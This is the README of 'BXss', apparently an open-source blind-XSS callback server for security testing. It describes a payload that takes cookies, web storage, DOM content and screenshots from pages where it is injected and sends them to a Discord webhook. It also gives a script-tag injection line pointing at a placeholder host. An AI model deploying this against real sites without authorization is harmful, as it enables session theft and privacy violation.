# BXss - Blind XSS Callback Server

A powerful Blind XSS callback server written in Go that serves XSS payloads and receives callbacks with detailed information including screenshots, cookies, localStorage, and more.

## Features

- 🎯 **Path-based tracking** - Each served payload is tagged with its request path
- 📸 **Screenshot capture** - Automatically captures screenshots using html2canvas
- 🍪 **Data collection** - Gathers cookies, localStorage, sessionStorage, DOM, and more
- 📱 **Discord integration** - Sends rich notifications with embedded screenshots
- 💾 **Local storage** - Saves all data locally for analysis
- 🔧 **Configurable** - Custom domain and Discord webhook support
- 🎛️ **Verbose logging** - Optional detailed logging for debugging

## Installation

### From GitHub (Recommended)

```bash
go install github.com/0xRTH/bxss@latest
```

### From Source

```bash
git clone https://github.com/0xRTH/bxss.git
cd bxss
go install
```

## Usage

### Basic Usage

```bash
bxss -domain your-domain.com:8083 -webhook https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
```

### With Verbose Logging

```bash
bxss -domain your-domain.com:8083 -webhook https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN -v
```

### Local Development

```bash
bxss -domain localhost:8083 -webhook https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN
```

## Command Line Flags

| Flag | Description | Required | Default |
|------|-------------|----------|---------|
| `-domain` | Domain for callback URL | No | `localhost:8083` |
| `-webhook` | Discord webhook URL | Yes | - |
| `-v` | Enable verbose logging | No | `false` |

## How It Works

1. **Server Setup**: The server starts on port 8083 and serves the XSS payload on any path
2. **Payload Injection**: When a page loads the payload, it collects:
   - Current URL and origin
   - Cookies and storage data
   - DOM content
   - Screenshot (if html2canvas is available)
3. **Callback**: Data is sent back to your server
4. **Discord Notification**: Rich embed with all data and embedded screenshot
5. **Local Storage**: All data is saved locally for analysis

## Discord Integration

The server sends rich Discord embeds containing:
- 🎯 Path information
- 🌐 URL and origin details
- 🍪 Cookies and storage data
- 📋 DOM preview
- 📸 Embedded screenshot
- 🤖 User agent information

## File Structure

```
bxss/
├── main.go          # Main server code
├── bxss.js          # XSS payload
├── go.mod           # Go module file
├── README.md        # This file
└── callbacks/       # Generated callback data (created at runtime)
    └── path_timestamp/
        ├── data.json
        ├── dom.html
        └── screenshot.jpg
```

## Example Discord Output

The Discord webhook will receive a rich embed with:
- All collected data in organized fields
- Screenshot embedded directly in the message
- Color-coded for easy identification
- Timestamp and server information

## Security Considerations

- The server accepts connections from any origin (CORS enabled)
- All callback data is logged and stored locally
- Discord webhook URLs should be kept private
- Consider using HTTPS in production

## Development

### Prerequisites

- Go 1.21 or later
- Discord webhook URL

### Building

```bash
go build -o bxss main.go
```

### Testing

1. Start the server with your Discord webhook
2. Include the payload in any HTML page: `<script src="http://your-domain:8083/any-path"></script>`
3. Open the page in a browser
4. Check Discord for the callback notification

## License

MIT License - see LICENSE file for details

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## Support

If you encounter any issues or have questions, please open an issue on GitHub. 